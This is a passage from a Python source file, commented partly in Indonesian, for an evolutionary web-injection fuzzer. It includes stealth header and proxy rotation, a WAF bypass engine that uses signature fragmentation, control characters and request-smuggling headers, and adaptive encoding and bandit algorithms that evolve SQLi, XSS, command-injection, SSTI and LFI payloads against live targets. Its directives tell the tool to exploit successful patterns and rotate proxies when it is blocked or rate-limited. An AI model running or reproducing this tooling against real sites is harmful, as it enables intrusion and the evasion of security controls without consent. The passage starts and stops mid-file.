    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/5336 Edg/120.0.0.0",
]


def get_stealth_headers() -> Dict[str, str]:
    """Generate randomized stealth headers for each request."""
    ua = (UA_ROTATOR.random if HAS_FAKE_UA
          else random.choice(STEALTH_HEADERS))

    headers = {
        "User-Agent": ua,
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        ]),
        "Accept-Language": random.choice([
            "en-US,en;q=0.9,id;q=0.8",
            "en-US,en;q=0.9",
            "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "en-GB,en;q=0.9",
        ]),
        "Accept-Encoding": random.choice([
            "gzip, deflate, br",
            "gzip, deflate",
            "gzip, deflate, br, zstd",
        ]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "same-origin"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User": "?1",
        "Cache-Control": random.choice(["max-age=0", "no-cache"]),
        "DNT": random.choice(["1", "0"]),
    }

    if random.random() < 0.3:
        headers["Referer"] = random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "",
        ])
    if random.random() < 0.2:
        headers["Pragma"] = "no-cache"
    if random.random() < 0.15:
        headers["Sec-CH-UA-Platform"] = random.choice([
            '"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"'
        ])

    return headers


def get_stealth_client(proxy_dict: Dict = None):
    """
    v6.0.1: Fixed httpx compatibility — handles both proxies (old) and proxy (new).
    """
    if not HAS_HTTPX:
        return None
    headers = get_stealth_headers()

    # Build correct proxy argument based on httpx version
    proxy_kwargs = _build_httpx_proxy_arg(proxy_dict)

    if HAS_H2:
        try:
            return httpx.Client(
                headers=headers, follow_redirects=True, timeout=30.0,
                verify=False, http2=True,
                **proxy_kwargs,
                limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
            )
        except (ImportError, Exception):
            pass
    try:
        return httpx.Client(
            headers=headers, follow_redirects=True, timeout=30.0,
            verify=False, http2=False,
            **proxy_kwargs,
            limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
        )
    except Exception:
        # Ultimate fallback: no proxy, no http2
        try:
            return httpx.Client(
                headers=headers, follow_redirects=True, timeout=30.0,
                verify=False, http2=False,
                limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
            )
        except Exception:
            return None


# ============================================================
# ENUMS & CONSTANTS (preserved from v5.0)
# ============================================================
class InjectionContext(Enum):
    SQL_STRING = "sql_string"
    SQL_NUMERIC = "sql_numeric"
    SQL_IDENTIFIER = "sql_identifier"
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_HREF = "html_href"
    HTML_SCRIPT = "html_script"
    JS_STRING = "js_string"
    URL_PARAM = "url_param"
    SHELL_ARG = "shell_arg"
    SHELL_STRING = "shell_string"
    UNKNOWN = "unknown"


class MutationType(Enum):
    CASE_VARIATION = "case_variation"
    COMMENT_INSERTION = "comment_insertion"
    WHITESPACE_PADDING = "whitespace_padding"
    CHAR_ENCODING = "char_encoding"
    STRING_CONCAT = "string_concat"
    NULL_BYTE_APPEND = "null_byte_append"
    UNICODE_NORMALIZE = "unicode_normalize"
    DOUBLE_ENCODING = "double_encoding"
    HTML_ENTITY_MIX = "html_entity_mix"
    NESTED_ENCODING = "nested_encoding"
    KEYWORD_SPLIT = "keyword_split"
    ALTERNATIVE_SYNTAX = "alternative_syntax"
    HOMOGLYPH = "homoglyph"
    BACKSLASH_ESCAPE = "backslash_escape"
    NEWLINE_INJECTION = "newline_injection"
    TAB_SEPARATION = "tab_separation"
    BLOCK_COMMENT_WRAP = "block_comment_wrap"
    INLINE_COMMENT_SPLIT = "inline_comment_split"
    RECURSIVE_ENCODE = "recursive_encode"
    ZERO_WIDTH_INSERT = "zero_width_insert"
    URL_ENCODE = "url_encode"
    HEX_ENCODE = "hex_encode"
    OCTAL_ENCODE = "octal_encode"
    HPP_SPLIT = "hpp_split"
    CONTROL_CHAR_INSERT = "control_char_insert"


# ============================================================
# STATE-ACTION-REWARD SCHEMA (preserved from v5.0)
# ============================================================
@dataclass
class EvolutionRecord:
    """Mewakili satu catatan payload dan hasil evolusinya."""
    generation_id: str = ""
    parent_payload_id: str = ""
    generation_number: int = 0
    mutation_history: List[str] = field(default_factory=list)
    payload_syntax: str = ""
    category: str = ""
    strategy: str = ""
    execution_context: Dict[str, Any] = field(default_factory=dict)
    feedback_loop: Dict[str, Any] = field(default_factory=dict)
    fitness_score: float = 0.0
    is_alive: bool = True
    proxy_used: str = ""
    tls_fingerprint: str = ""
    throttle_delay: float = 0.0

    def to_dict(self):
        return asdict(self)


class EvolutionSchema:
    """Menyimpan riwayat generasi, feedback, fitness, dan directive evolusi."""
    def __init__(self):
        self.records: Dict[str, EvolutionRecord] = {}
        self.generation_counter = 0
        self.blocked_mutations: Set[str] = set()
        self.successful_chains: List[Dict] = []
        self.mutation_blacklist_count: Dict[str, int] = defaultdict(int)
        self.encoding_blacklist_count: Dict[str, int] = defaultdict(int)
        self.rate_limit_events: List[Dict] = []
        # v6.1 NEW
        self.clusterer = SemanticPayloadClusterer(min_cluster_size=3, eps=0.4)
        self.waf_fingerprinter = WAFFingerprinter()
        # v6.1 NEW: WAF Type Tracking (complement existing fingerprinter)
        self.waf_type = "Unknown"
        self.waf_confidence = 0.0
        self.waf_history: List[Dict] = []



    def create_record(self, payload_dict: Dict, parent_id: str = "",
                     mutations: List[str] = None) -> EvolutionRecord:
        self.generation_counter += 1
        gen_id = str(uuid.uuid4())[:8]
        record = EvolutionRecord(
            generation_id=gen_id,
            parent_payload_id=parent_id,
            generation_number=self.generation_counter,
            mutation_history=mutations or [],
            payload_syntax=payload_dict.get("payload", "")[:200],
            category=payload_dict.get("category", ""),
            strategy=payload_dict.get("strategy", ""),
            execution_context={
                "vulnerability_type": payload_dict.get("category", ""),
                "target_parser": "",
                "waf_detected": "",
                "length_tier": payload_dict.get("length_tier", ""),
            },
        )
        self.records[gen_id] = record
        return record

    def record_feedback(self, gen_id: str, status_code: int,
                       response_signature: str, response_type: str,
                       anomaly_score: float, waf_detected: str = "",
                       proxy_used: str = "", tls_fp: str = "",
                       throttle_delay: float = 0.0):
        if gen_id not in self.records:
            return
        record = self.records[gen_id]

        record.proxy_used = proxy_used
        record.tls_fingerprint = tls_fp
        record.throttle_delay = throttle_delay

        directive = self._generate_directive(status_code, response_type,
                                            response_signature, record)

        record.feedback_loop = {
            "http_status_code": status_code,
            "response_signature": response_signature[:100],
            "response_type": response_type,
            "anomaly_score": anomaly_score,
            "mutation_directive": directive,
            "proxy_used": proxy_used[:50],
            "tls_fingerprint": tls_fp,
            "throttle_delay": throttle_delay,
            "timestamp": datetime.now().isoformat(),
        }

        if waf_detected:
            record.execution_context["waf_detected"] = waf_detected

        record.fitness_score = self._calculate_fitness(
            status_code, response_type, anomaly_score
        )

        if response_type == "blocked":
            for mut in record.mutation_history:
                self.mutation_blacklist_count[mut] += 1
                if self.mutation_blacklist_count[mut] >= 3:
                    self.blocked_mutations.add(mut)

        if status_code == 429:
            self.rate_limit_events.append({
                "gen_id": gen_id,
                "proxy": proxy_used[:50],
                "timestamp": datetime.now().isoformat(),
                "throttle_delay": throttle_delay,
            })

        if response_type == "server_output":
            record.is_alive = True
            self.successful_chains.append({
                "generation_id": gen_id,
                "parent_id": record.parent_payload_id,
                "mutations": record.mutation_history,
                "category": record.category,
                "strategy": record.strategy,
                "fitness": record.fitness_score,
                "directive": directive,
                "proxy_used": proxy_used[:50],
                "tls_fingerprint": tls_fp,
            })
        else:
            record.is_alive = False

    def _calculate_fitness(self, status: int, resp_type: str,
                          anomaly: float) -> float:
        if resp_type == "server_output":
            return 1.0
        elif resp_type == "raw_html":
            if status == 200:
                return 0.3 + (anomaly / 200.0)
            return 0.1
        elif resp_type == "blocked":
            return max(0.0, 0.1 - (anomaly / 500.0))
        return 0.0

    def _generate_directive(self, status: int, resp_type: str,
                           signature: str, record: EvolutionRecord) -> str:
        if resp_type == "server_output":
            return "SUCCESS - Exploit this pattern, create variants"
        elif resp_type == "blocked":
            if status == 429:
                return "RATE LIMITED - Rotate proxy, increase throttle delay, use different TLS fingerprint"
            elif status == 403:
                return "WAF BLOCKED - Increase obfuscation, try alternative encoding, rotate proxy"
            elif status == 406:
                return "NOT ACCEPTABLE - Change content type or encoding"
            else:
                return f"BLOCKED ({status}) - Drastically change strategy, rotate proxy"
        elif resp_type == "raw_html":
            return "NORMAL RESPONSE - Payload not effective, try different injection context"
        return "UNKNOWN - Explore new strategies"

    def get_blocked_mutations(self) -> Set[str]:
        return self.blocked_mutations.copy()

    def get_best_parents(self, top_n: int = 10) -> List[EvolutionRecord]:
        alive = [r for r in self.records.values() if r.fitness_score > 0.2]
        alive.sort(key=lambda r: r.fitness_score, reverse=True)
        return alive[:top_n]

    def get_evolution_log(self) -> List[Dict]:
        log = []
        for gen_id, record in self.records.items():
            log.append({
                "gen_id": gen_id,
                "parent_id": record.parent_payload_id,
                "gen_num": record.generation_number,
                "category": record.category,
                "strategy": record.strategy,
                "mutations": record.mutation_history,
                "fitness": record.fitness_score,
                "alive": record.is_alive,
                "feedback": record.feedback_loop,
                "proxy_used": record.proxy_used,
                "tls_fingerprint": record.tls_fingerprint,
                "throttle_delay": record.throttle_delay,
            })
        return log

    def print_evolution_summary(self):
        total = len(self.records)
        alive = sum(1 for r in self.records.values() if r.is_alive)
        blocked_muts = len(self.blocked_mutations)
        best_fitness = max((r.fitness_score for r in self.records.values()), default=0)
        avg_fitness = (sum(r.fitness_score for r in self.records.values()) / max(1, total))
        rate_limits = len(self.rate_limit_events)

        print(f"\n  \033[1;36m[EVOLUTION]\033[0m Summary:")
        print(f"    Generations    : {total}")
        print(f"    Alive (fit>0)  : {alive}")
        print(f"    Best fitness   : {best_fitness:.3f}")
        print(f"    Avg fitness    : {avg_fitness:.3f}")
        print(f"    Blocked muts   : {blocked_muts}")
        print(f"    Success chains : {len(self.successful_chains)}")
        print(f"    Rate limits    : {rate_limits}")


# ============================================================
# GRAMMAR VALIDATOR (preserved from v5.0)
# ============================================================
class GrammarValidator:
    """Memeriksa struktur dasar payload berdasarkan kategori injeksinya."""
    SQL_KEYWORD_ORDER = [
        "SELECT", "FROM", "WHERE", "GROUP BY", "HAVING",
        "ORDER BY", "LIMIT", "UNION", "INSERT", "UPDATE",
        "DELETE", "DROP", "CREATE", "ALTER"
    ]
    SQL_FUNCTIONS = [
        r"CONCAT\s*$", r"SUBSTRING\s*$", r"ASCII\s*$",
        r"CHAR\s*$", r"LENGTH\s*$", r"VERSION\s*$",
        r"DATABASE\s*$", r"USER\s*$", r"COUNT\s*$",
        r"GROUP_CONCAT\s*$", r"HEX\s*$", r"UNHEX\s*$",
        r"SLEEP\s*$", r"BENCHMARK\s*$", r"IF\s*$",
        r"IFNULL\s*$", r"COALESCE\s*$", r"MID\s*$",
        r"LEFT\s*$", r"RIGHT\s*$", r"TRIM\s*$",
        r"UPPER\s*$", r"LOWER\s*$", r"CAST\s*$",
        r"CONVERT\s*$", r"LOAD_FILE\s*$",
    ]
    HTML_TAGS = [
        "script", "img", "svg", "iframe", "body", "input", "details",
        "video", "audio", "marquee", "math", "object", "embed",
        "link", "meta", "base", "form", "button", "select",
        "textarea", "style", "div", "span", "a", "p", "h1",
        "table", "tr", "td", "noscript", "template", "slot",
    ]
    HTML_EVENTS = [
        "onload", "onerror", "onmouseover", "onfocus", "onblur",
        "onanimationend", "onclick", "onsubmit", "onchange",
        "oninput", "onkeydown", "onkeyup", "onmousedown",
        "onscroll", "ontoggle", "onpageshow", "onbeforeunload",
        "onhashchange", "onresize", "onwheel", "ondrag",
        "ondrop", "oncopy", "onpaste", "oncut", "ondblclick",
        "oncontextmenu", "onpointerdown", "onpointerup",
        "onanimationstart", "ontransitionend", "ontouchstart",
    ]
    SHELL_SEPARATORS = [";", "|", "||", "&&", "&", "`", "$(", "\n", "%0a"]

    def validate_sql(self, payload: str) -> Tuple[bool, str]:
        paren_count = 0
        for c in payload:
            if c == '(': paren_count += 1
            elif c == ')': paren_count -= 1
            if paren_count < 0:
                return False, "Unbalanced parentheses"
        if paren_count != 0:
            return False, "Unbalanced parentheses"
        upper = payload.upper()
        if "UNION" in upper and "SELECT" in upper:
            union_pos = upper.find("UNION")
            select_pos = upper.find("SELECT", union_pos)
            if select_pos == -1:
                return False, "UNION without SELECT"
        return True, "Valid SQL syntax"

    def validate_xss(self, payload: str) -> Tuple[bool, str]:
        tag_pattern = re.compile(r'<(\w+)[^>]*\s(on\w+)\s*=', re.I)
        for match in tag_pattern.finditer(payload):
            tag = match.group(1).lower()
            if tag not in self.HTML_TAGS and tag not in ["animate", "set", "mtext",
                                                          "mglyph", "foreignobject",
                                                          "source", "track"]:
                return False, f"Unknown tag: {tag}"
        return True, "Valid XSS syntax"

    def validate_cmdi(self, payload: str) -> Tuple[bool, str]:
        backtick_count = payload.count("`")
        if backtick_count % 2 != 0:
            return False, "Unbalanced backticks"
        subshell_count = payload.count("$(")
        close_paren = payload.count(")")
        if subshell_count > close_paren:
            return False, "Unbalanced subshell"
        return True, "Valid shell syntax"

    def validate_ssti(self, payload: str) -> Tuple[bool, str]:
        pairs = [("{{", "}}"), ("${", "}"), ("#{", "}"),
                 ("<%", "%>"), ("{%", "%}"), ("[[", "]]")]
        for open_d, close_d in pairs:
            if open_d in payload and close_d not in payload:
                return False, f"Unmatched delimiter: {open_d}"
        return True, "Valid SSTI syntax"

    def validate_lfi(self, payload: str) -> Tuple[bool, str]:
        return True, "Valid LFI syntax"

    def validate(self, payload: str, category: str) -> Tuple[bool, str]:
        validators = {
            "sqli": self.validate_sql, "xss": self.validate_xss,
            "cmdi": self.validate_cmdi, "ssti": self.validate_ssti,
            "lfi": self.validate_lfi,
        }
        validator = validators.get(category)
        if validator:
            return validator(payload)
        return True, "No grammar rules for category"


# ============================================================
# CONTEXT DETECTOR (preserved from v5.0)
# ============================================================
class ContextDetector:
    """Mendeteksi konteks refleksi parameter dari isi respons HTTP."""
    def __init__(self):
        self.context_patterns = {
            InjectionContext.SQL_STRING: [
                r"'[^']*PARAM[^']*'", r'"[^"]*PARAM[^"]*"',
                r"WHERE\s+\w+\s*=\s*['\"]", r"mysql", r"sql", r"query",
            ],
            InjectionContext.SQL_NUMERIC: [
                r"WHERE\s+\w+\s*=\s*\d", r"LIMIT\s+\d", r"id\s*=\s*\d",
            ],
            InjectionContext.HTML_BODY: [
                r"<[^>]*>.*PARAM.*</", r"<div[^>]*>.*PARAM",
                r"<p[^>]*>.*PARAM", r"<span[^>]*>.*PARAM",
            ],
            InjectionContext.HTML_ATTRIBUTE: [
                r'value\s*=\s*"[^"]*PARAM', r'value\s*=\s*\'[^\']*PARAM',
                r'placeholder\s*=\s*"[^"]*PARAM',
            ],
            InjectionContext.HTML_HREF: [
                r'href\s*=\s*"[^"]*PARAM', r'src\s*=\s*"[^"]*PARAM',
                r'action\s*=\s*"[^"]*PARAM',
            ],
            InjectionContext.HTML_SCRIPT: [
                r'<script[^>]*>.*PARAM', r'var\s+\w+\s*=\s*["\'].*PARAM',
                r'document\.\w+.*PARAM',
            ],
            InjectionContext.SHELL_ARG: [
                r'shell_exec', r'exec\s*$', r'system\s*$',
                r'passthru', r'proc_open', r'popen',
            ],
        }

    def detect_context(self, response_text: str, param_name: str,
                      param_value: str) -> InjectionContext:
        if not response_text:
            return InjectionContext.UNKNOWN
        text = response_text.lower()
        param_lower = param_value.lower()
        scores = {}
        for context, patterns in self.context_patterns.items():
            score = 0
            for pattern in patterns:
                try:
                    if re.search(pattern, response_text, re.I):
                        score += 1
                    if param_lower in text:
                        if f"'{param_lower}'" in text or f'"{param_lower}"' in text:
                            if context in [InjectionContext.SQL_STRING,
                                         InjectionContext.HTML_ATTRIBUTE]:
                                score += 2
                except re.error:
                    continue
            scores[context] = score
        if scores:
            best = max(scores, key=scores.get)
            if scores[best] > 0:
                return best
        if any(kw in text for kw in ["mysql", "sql", "query", "database", "table"]):
            return InjectionContext.SQL_STRING
        if any(kw in text for kw in ["<script", "javascript", "document."]):
            return InjectionContext.HTML_SCRIPT
        if any(kw in text for kw in ["shell_exec", "exec(", "system("]):
            return InjectionContext.SHELL_ARG
        return InjectionContext.UNKNOWN

    def get_recommended_categories(self, context: InjectionContext) -> List[str]:
        recommendations = {
            InjectionContext.SQL_STRING: ["sqli", "xss", "ssti"],
            InjectionContext.SQL_NUMERIC: ["sqli", "xss"],
            InjectionContext.SQL_IDENTIFIER: ["sqli"],
            InjectionContext.HTML_BODY: ["xss", "ssti"],
            InjectionContext.HTML_ATTRIBUTE: ["xss", "sqli"],
            InjectionContext.HTML_HREF: ["xss", "redirect", "sqli"],
            InjectionContext.HTML_SCRIPT: ["xss", "ssti"],
            InjectionContext.JS_STRING: ["xss", "ssti"],
            InjectionContext.URL_PARAM: ["redirect", "lfi", "sqli", "xss"],
            InjectionContext.SHELL_ARG: ["cmdi", "sqli"],
            InjectionContext.SHELL_STRING: ["cmdi"],
            InjectionContext.UNKNOWN: ["sqli", "xss", "ssti", "cmdi", "lfi"],
        }
        return recommendations.get(context, ["sqli", "xss", "ssti", "cmdi", "lfi"])


# ============================================================
# WAF BYPASS ENGINE (preserved from v5.0)
# ============================================================
class WAFBypassEngine:
    """Menyediakan transformasi payload untuk menguji variasi parsing WAF."""
    CONTROL_CHARS = ["%00", "%01", "%02", "%03", "%04", "%05",
                     "%06", "%07", "%08", "%09", "%0b", "%0c",
                     "%0e", "%0f", "%10", "%11", "%12", "%13",
                     "%14", "%15", "%16", "%17", "%18", "%19",
                     "%1a", "%1b", "%1c", "%1d", "%1e", "%1f"]
    NON_STANDARD_WHITESPACE = [
        "%09", "%0a", "%0b", "%0c", "%0d", "%20",
        "%a0", "%c2%a0",
        "%e2%80%80", "%e2%80%81", "%e2%80%82",
        "%e2%80%83", "%e2%80%84", "%e2%80%85",
        "%e2%80%86", "%e2%80%87", "%e2%80%88",
        "%e2%80%89", "%e2%80%8a",
    ]

    def apply_hpp(self, param_name: str, payload: str) -> Dict[str, List[str]]:
        parts = self._split_payload_smart(payload)
        if len(parts) <= 1:
            return {param_name: [payload]}
        result = {}
        for i, part in enumerate(parts):
            key = param_name
            if key not in result:
                result[key] = []
            # v7.0 FIX: urlencode setiap bagian HPP untuk memastikan encoding konsisten
            result[key].append(urlencode({key: part}, doseq=True).split("=", 1)[-1] if "=" in urlencode({key: part}) else part)
        return result

    def _split_payload_smart(self, payload: str) -> List[str]:
        if len(payload) < 10:
            return [payload]
        split_points = []
        for i, c in enumerate(payload):
            if c in [' ', '\t', '\n']:
                split_points.append(i)
            if payload[i:i+4] == "/**/":
                split_points.append(i + 2)
        if not split_points:
            mid = len(payload) // 2
            return [payload[:mid], payload[mid:]]
        num_splits = min(3, len(split_points))
        chosen = random.sample(split_points, min(num_splits, len(split_points)))
        chosen.sort()
        parts = []
        prev = 0
        for sp in chosen:
            if sp > prev:
                parts.append(payload[prev:sp])
            prev = sp
        if prev < len(payload):
            parts.append(payload[prev:])
        return [p for p in parts if p]

    def insert_control_chars(self, payload: str, density: float = 0.1) -> str:
        result = list(payload)
        insertions = int(len(payload) * density)
        for _ in range(insertions):
            pos = random.randint(1, len(result) - 1)
            char = random.choice(self.CONTROL_CHARS)
            result.insert(pos, char)
        return "".join(result)

    def insert_non_standard_whitespace(self, payload: str) -> str:
        ws = random.choice(self.NON_STANDARD_WHITESPACE)
        return payload.replace(" ", ws)

    def fragment_signature(self, payload: str, category: str) -> str:
        if category == "sqli":
            keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
                       "INSERT", "UPDATE", "DELETE", "DROP", "SLEEP",
                       "BENCHMARK", "WAITFOR", "DELAY"]
            result = payload
            for kw in keywords:
                if kw.lower() in result.lower():
                    frag_methods = [
                        lambda k: f"{k[:2]}/**/{k[2:]}",
                        lambda k: f"{k[:3]}/*!*/{k[3:]}" if len(k) > 3 else f"{k[:1]}/**/{k[1:]}",
                        lambda k: f"{k[:1]}/*!50000{k[1:]}*/" if len(k) > 1 else k,
                        lambda k: "".join(c.upper() if i % 2 == 0 else c.lower()
                                         for i, c in enumerate(k)),
                    ]
                    method = random.choice(frag_methods)
                    try:
                        replacement = method(kw)
                        result = re.sub(re.escape(kw), replacement, result,
                                       count=1, flags=re.I)
                    except:
                        continue
            return result
        elif category == "xss":
            result = payload
            if "<script>" in result.lower():
                result = re.sub(r'<script>', '<scr<!-- -->ipt>', result, flags=re.I)
            if "javascript:" in result.lower():
                result = re.sub(r'javascript:', 'java\\tscript:', result, flags=re.I)
            return result
        return payload

    def protocol_smuggling_headers(self) -> Dict[str, str]:
        smuggling_headers = {}
        technique = random.choice(["xff", "double_host", "chunked", "transfer"])
        if technique == "xff":
            smuggling_headers["X-Forwarded-For"] = "127.0.0.1"
            smuggling_headers["X-Real-IP"] = "127.0.0.1"
        elif technique == "double_host":
            smuggling_headers["Host"] = "localhost"
        elif technique == "chunked":
            smuggling_headers["Transfer-Encoding"] = "chunked"
        elif technique == "transfer":
            smuggling_headers["Transfer-Encoding"] = "identity"
        return smuggling_headers

    def apply_waf_bypass(self, payload: str, category: str,
                        waf_type: str = "") -> Tuple[str, Dict[str, str]]:
        extra_headers = {}
        modified = payload
        if random.random() < 0.6:
            modified = self.fragment_signature(modified, category)
        if random.random() < 0.3:
            modified = self.insert_control_chars(modified, 0.05)
        if random.random() < 0.4:
            modified = self.insert_non_standard_whitespace(modified)
        if random.random() < 0.2:
            extra_headers = self.protocol_smuggling_headers()
        if waf_type == "cloudflare":
            modified = modified.replace(" ", random.choice(["%0a%09", "%0d%0a%20"]))
        elif waf_type == "modsecurity":
            extra_headers["Transfer-Encoding"] = "chunked"
        elif waf_type == "incapsula":
            modified = quote(modified, safe="")
        return modified, extra_headers


# ============================================================
# ADAPTIVE ENCODING ROTATION (preserved from v5.0)
# ============================================================
class AdaptiveEncodingRotation:
    """Memutar rantai encoding berdasarkan hasil pengujian sebelumnya."""
    ENCODING_CHAINS = [
        ["raw"], ["url_encode"], ["double_url_encode"], ["hex_encode"],
        ["html_entity"], ["unicode_escape"],
        ["url_encode", "html_entity"], ["hex_encode", "case_alter"],
        ["double_url_encode", "comment_obfuscate"],
        ["url_encode", "case_alter", "comment_obfuscate"],
        ["html_entity", "unicode_escape"], ["triple_url_encode"],
        ["url_encode", "hex_encode", "case_alter"],
        ["double_url_encode", "html_entity", "zero_width"],
        ["unicode_escape", "case_alter", "comment_obfuscate"],
    ]

    def __init__(self):
        self.chain_scores: Dict[int, float] = {i: 0.5 for i in range(len(self.ENCODING_CHAINS))}
        self.chain_failures: Dict[int, int] = {i: 0 for i in range(len(self.ENCODING_CHAINS))}
        self.current_chain_index = 0
        self.rotation_threshold = 3

    def get_current_chain(self) -> List[str]:
        return self.ENCODING_CHAINS[self.current_chain_index]

    def record_result(self, chain_index: int, success: bool):
        if success:
            self.chain_scores[chain_index] = min(1.0, self.chain_scores[chain_index] + 0.1)
            self.chain_failures[chain_index] = 0
        else:
            self.chain_scores[chain_index] = max(0.0, self.chain_scores[chain_index] - 0.05)
            self.chain_failures[chain_index] += 1
            if self.chain_failures[chain_index] >= self.rotation_threshold:
                self._rotate_to_next()

    def _rotate_to_next(self):
        best_idx = self.current_chain_index
        best_score = -1
        for idx, score in self.chain_scores.items():
            if idx != self.current_chain_index and self.chain_failures[idx] < self.rotation_threshold:
                if score > best_score:
                    best_score = score
                    best_idx = idx
        if best_idx == self.current_chain_index:
            for idx in self.chain_failures:
                self.chain_failures[idx] = 0
            best_idx = random.randint(0, len(self.ENCODING_CHAINS) - 1)
        self.current_chain_index = best_idx

    def apply_chain(self, payload: str, chain: List[str] = None) -> str:
        if chain is None:
            chain = self.get_current_chain()
        result = payload
        for encoding in chain:
            result = self._apply_encoding(result, encoding)
        return result

    def _apply_encoding(self, text: str, encoding: str) -> str:
        if encoding == "raw": return text
        elif encoding == "url_encode": return quote(text, safe="")
        elif encoding == "double_url_encode": return quote(quote(text, safe=""), safe="")
        elif encoding == "triple_url_encode": return quote(quote(quote(text, safe=""), safe=""), safe="")
        elif encoding == "hex_encode":
            return "".join(f"\\x{ord(c):02x}" if random.random() < 0.5 else c for c in text)
        elif encoding == "html_entity":
            return "".join(f"&#{ord(c)};" if random.random() < 0.5 else c for c in text)
        elif encoding == "unicode_escape":
            return "".join(f"\\u{ord(c):04x}" if random.random() < 0.5 else c for c in text)
        elif encoding == "case_alter":
            return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in text)
        elif encoding == "comment_obfuscate":
            comments = ["/**/", "/*!*/", "/**x**/"]
            result = text
            for c in [' ', '\t']:
                if c in result:
                    result = result.replace(c, random.choice(comments), 1)
            return result
        elif encoding == "zero_width":
            zw = random.choice(["\u200b", "\u200c", "\u200d", "\ufeff"])
            if len(text) > 3:
                pos = random.randint(1, len(text) - 1)
                return text[:pos] + zw + text[pos:]
            return text
        return text

    def get_rotation_summary(self) -> str:
        chain = self.ENCODING_CHAINS[self.current_chain_index]
        score = self.chain_scores[self.current_chain_index]
        return f"Chain[{self.current_chain_index}]: {'→'.join(chain)} (score={score:.2f})"

# ============================================================
# MULTI-ARMED BANDIT MUTATION SELECTOR (v6.1 — UCB1 Algorithm)
# ============================================================
class MutationBanditSelector:
    """Memilih mutasi memakai skor UCB1 dan feedback per tipe WAF."""
    """
    Implements Upper Confidence Bound (UCB1) algorithm for adaptive mutation selection.
    Each mutation type is treated as an "arm" of a multi-armed bandit.
    The selector balances exploration (trying new mutations) and exploitation (using known good mutations).
    """
    
    def __init__(self, mutation_types: List[str], exploration_constant: float = 2.0):
        self.mutation_types = mutation_types
        self.exploration_constant = exploration_constant
        
        # Track statistics for each mutation arm
        self.counts = {mut: 0 for mut in mutation_types}          # Number of times mutation was selected
        self.values = {mut: 0.0 for mut in mutation_types}        # Cumulative reward for the mutation
        self.successes = {mut: 0 for mut in mutation_types}       # Number of successful outcomes
        self.total_selections = 0                                 # Total number of selections made
        
        # For context-specific learning (WAF type)
        self.context_values = defaultdict(lambda: defaultdict(float))  # {waf_type: {mutation: value}}
        self.context_counts = defaultdict(lambda: defaultdict(int))    # {waf_type: {mutation: count}}
        
    def select_mutation(self, waf_type: str = "") -> str:
        """
        Selects a mutation using UCB1 formula.
        If a WAF type is provided, uses context-specific statistics.
        """
        if self.total_selections == 0:
            # First selection: pick randomly
            selected = random.choice(self.mutation_types)
            self.total_selections += 1
            self.counts[selected] += 1
            return selected
            
        ucb_values = {}
        current_counts = self.context_counts[waf_type] if waf_type else self.counts
        current_values = self.context_values[waf_type] if waf_type else self.values
        
        for mutation in self.mutation_types:
            if current_counts[mutation] == 0:
                # Never tried this mutation in this context: high exploration bonus
                ucb_values[mutation] = float('inf')
            else:
                # UCB1 formula: exploitation + exploration
                exploitation = current_values[mutation] / current_counts[mutation]
                exploration = self.exploration_constant * math.sqrt(
                    math.log(self.total_selections) / current_counts[mutation]
                )
                ucb_values[mutation] = exploitation + exploration
                
        # Select mutation with highest UCB value
        selected = max(ucb_values, key=ucb_values.get)
        self.total_selections += 1
        self.counts[selected] += 1
        
        if waf_type:
            self.context_counts[waf_type][selected] += 1
            
        return selected
        
    def update_reward(self, mutation: str, reward: float, waf_type: str = ""):
        """
        Updates the reward for a selected mutation.
        Reward should be between 0.0 (failure) and 1.0 (success).
        """
        self.values[mutation] += reward
        self.successes[mutation] += 1 if reward > 0.5 else 0
        
        if waf_type:
            self.context_values[waf_type][mutation] += reward
            
    def get_best_mutations(self, top_k: int = 5, waf_type: str = "") -> List[Tuple[str, float]]:
        """
        Returns the top-k best mutations based on average reward.
        """
        current_counts = self.context_counts[waf_type] if waf_type else self.counts
        current_values = self.context_values[waf_type] if waf_type else self.values
        
        avg_rewards = []
        for mutation in self.mutation_types:
            if current_counts[mutation] > 0:
                avg_reward = current_values[mutation] / current_counts[mutation]
                avg_rewards.append((mutation, avg_reward))
                
        avg_rewards.sort(key=lambda x: x[1], reverse=True)
        return avg_rewards[:top_k]
        
    def get_stats(self) -> Dict:
        """Returns statistics about mutation performance."""
        total_success = sum(self.successes.values())
        total_attempts = sum(self.counts.values())
        overall_success_rate = total_success / max(1, total_attempts)
        
        # Get top 3 mutations by success rate
        mutation_stats = []
        for mut in self.mutation_types:
            if self.counts[mut] > 0:
                success_rate = self.successes[mut] / self.counts[mut]
                mutation_stats.append({
                    "mutation": mut,
                    "attempts": self.counts[mut],
                    "successes": self.successes[mut],
                    "success_rate": success_rate
                })
                
        mutation_stats.sort(key=lambda x: x["success_rate"], reverse=True)
        
        return {
            "total_selections": self.total_selections,
            "overall_success_rate": overall_success_rate,
            "top_mutations": mutation_stats[:3]
        }

# ============================================================
# THOMPSON SAMPLING BANDIT (v7.0 — Bayesian Mutation Selector)
# ============================================================
class ThompsonSamplingBandit:
    """Memilih mutasi memakai sampling Bayesian Thompson Sampling."""
    """
    Thompson Sampling menggunakan distribusi Beta untuk seleksi mutasi.
    Lebih agresif mengeksploitasi mutasi yang sedang efektif,
